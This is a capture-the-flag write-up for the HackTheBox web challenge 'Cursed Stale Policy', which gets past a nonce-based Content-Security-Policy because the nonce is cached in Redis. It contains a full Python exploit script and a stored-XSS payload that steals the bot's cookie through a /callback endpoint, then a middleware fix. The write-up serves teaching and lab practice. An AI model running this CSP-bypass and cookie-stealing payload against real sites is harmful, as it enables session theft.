---
layout: post
title: "Cursed Stale Policy"
date: 2027-07-06 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, csp-bypass, stale-nonce, cwe-693, websocket, stored-xss, bot-exploitation]
---

## Overview

Cursed Stale Policy is an HTB Web challenge (Easy) themed around a haunted CSP analyzer. The application correctly implements a nonce-based Content-Security-Policy — but caches it in Redis, so every request sees the same nonce. An attacker reads the nonce from any page response, injects a `<script nonce="KNOWN">` stored-XSS payload, then a bot visits and the script executes despite CSP, exfiltrating the flag cookie to an internal callback endpoint.

**[CWE-693](https://cwe.mitre.org/data/definitions/693.html) — Protection Mechanism Failure (CSP stale nonce)**

---

## The Technique

### CSP nonce caching bug — the "stale policy"

The `getCachedCSP()` function generates a nonce-based CSP on the first request and stores it in Redis. Every subsequent request returns the cached copy — including the same nonce — indefinitely:

```javascript
async function getCachedCSP() {
    let cachedCSP = await redis.get('cachedCSPHeader');
    if (cachedCSP) {
        return cachedCSP; // TODO: Should we cache the CSP header?
    }
    const nonce = crypto.randomBytes(16).toString('hex');
    const cspWithNonce = `... script-src 'self' 'nonce-${nonce}'; ...`;
    await redis.set('cachedCSPHeader', cspWithNonce);  // cached forever
    return cspWithNonce;
}
```

A CSP nonce is only secure if it is **different on every response**. Once cached, it becomes a static, observable value — an attacker who reads any response header knows the nonce for all future responses.

### XSS sink + bot

The `/xss` page renders a stored payload verbatim via EJS `<%- payload %>` (no escaping). The XSS is triggered via a WebSocket message `{type:"trigger_xss"}` which stores the payload and queues a job. A Puppeteer bot then visits `http://127.0.0.1:8000/xss` — with the flag in a cookie — and the payload executes.

The CSP allows `script-src 'self' 'nonce-NONCE'`. Since I know the nonce, a `<script nonce="NONCE">` tag in the payload bypasses the policy.

The `/callback` endpoint accepts any request and broadcasts the full request object (including query args) over WebSocket to connected clients.

---

## Solution

`solve.py`:

```python
#!/usr/bin/env python3
import sys, asyncio, json, re, requests, websockets

HOST = sys.argv[1] if len(sys.argv) > 1 else "target"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
BASE = f"http://{HOST}:{PORT}"

# 1. Read the cached CSP nonce — same value for every response
r = requests.get(BASE)
nonce = re.search(r"nonce-([a-f0-9]+)", r.headers["Content-Security-Policy"]).group(1)
print(f"[*] Cached nonce: {nonce}")

# 2. XSS payload with known nonce — exfils cookie to /callback
payload = f'<script nonce="{nonce}">fetch("/callback?c="+document.cookie)</script>'

async def exploit():
    async with websockets.connect(f"ws://{HOST}:{PORT}/ws") as ws:
        await ws.send(json.dumps({"type": "trigger_xss", "payload": payload}))
        for _ in range(30):
            try:
                data = json.loads(await asyncio.wait_for(ws.recv(), timeout=5))
                if data.get("type") == "update_logs":
                    for log in data.get("payload", []):
                        if "c" in log.get("args", {}):
                            m = re.search(r"HTB\{[^}]+\}", log["args"]["c"])
                            if m:
                                print(f"[+] FLAG: {m.group()}")
                                return
            except asyncio.TimeoutError:
                await ws.send(json.dumps({"type": "fetch_logs"}))

asyncio.run(exploit())
```

```bash
python3 solve.py <host> <port>
```

---

## Why it worked

A CSP nonce must be a per-request, unpredictable random value. The Redis cache makes it static — equivalent to removing the nonce entirely once an attacker observes it. The `/xss` route then provides a stored-XSS sink where the known nonce can be embedded in a script tag, and the bot's visit completes the cookie theft.

---

## Fix

```javascript
// Generate a fresh nonce per request in middleware — never cache it
async function CSPMiddleware(req, reply) {
    const nonce = crypto.randomBytes(16).toString('hex');
    reply.header('Content-Security-Policy',
        `default-src 'self'; script-src 'self' 'nonce-${nonce}'; ...`);
    req.nonce = nonce;
    // Do NOT store nonce in Redis or any shared cache
}
```
